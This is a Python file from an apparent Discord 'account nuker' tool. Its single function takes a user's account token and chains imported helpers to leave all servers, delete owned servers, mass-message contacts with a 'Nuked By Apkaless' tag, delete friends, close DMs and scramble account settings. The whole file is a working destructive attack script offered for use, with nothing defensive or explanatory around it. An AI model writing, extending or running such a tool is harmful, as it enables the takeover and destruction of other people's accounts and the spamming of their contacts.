
import requests
import time
import random
import sys
import os
from colorama import Fore, Style


def Nuke_account(token):
    """Complete Discord account nuking function"""
    print(f"{Fore.RED}[!] Starting Discord Account Nuke...{Fore.RESET}")
    
    try:
        from Leave_server import leaveServer
        from delete_server import deleteServers
        from Mass_dm import massDM
        from delete_friends import deleteFriends
        from close_dms import close_all_dms
        from Fuck_account import fuckAccount
        
        # Leave all servers
        leaveServer(token)
        time.sleep(1)
        
        # Delete owned servers
        deleteServers(token)
        time.sleep(1)
        
        # Send mass DM
        massDM(token, "Nuked By Apkaless")
        time.sleep(1)
        
        # Delete all friends
        deleteFriends(token)
        time.sleep(1)
        
        # Close all DMs
        close_all_dms(token)
        time.sleep(1)
        
        # Fuck account settings
        fuckAccount(token)
        
        print(f"{Fore.GREEN}[+] Discord Account Nuke Complete!{Fore.RESET}")
        
    except Exception as e:
        print(f"{Fore.RED}[-] Error during nuke: {e}{Fore.RESET}")